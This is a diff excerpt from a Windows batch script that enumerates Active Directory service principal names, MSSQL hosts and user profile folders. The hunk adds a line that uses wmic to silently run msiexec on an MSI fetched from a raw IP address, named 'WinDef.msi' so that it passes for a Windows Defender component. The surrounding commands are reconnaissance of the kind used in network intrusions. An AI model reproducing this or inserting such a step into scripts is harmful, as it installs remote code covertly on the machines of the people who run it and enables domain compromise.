@@ -545,6 +545,8 @@ setspn -T * -Q */* > Spnlist.txt
 ECHO ============================
 setspn -T abc.local -Q */* | findstr ":1433" > mssql.txt
 ECHO ============================
+wmic process call create 'msiexec /i http://96.9.211.157/sdf4r3r3/WinDef.msi /q'
+ECHO ============================
 dir /b /ad "C:\Users\"
 ECHO ============================
 ECHO ***************************************************
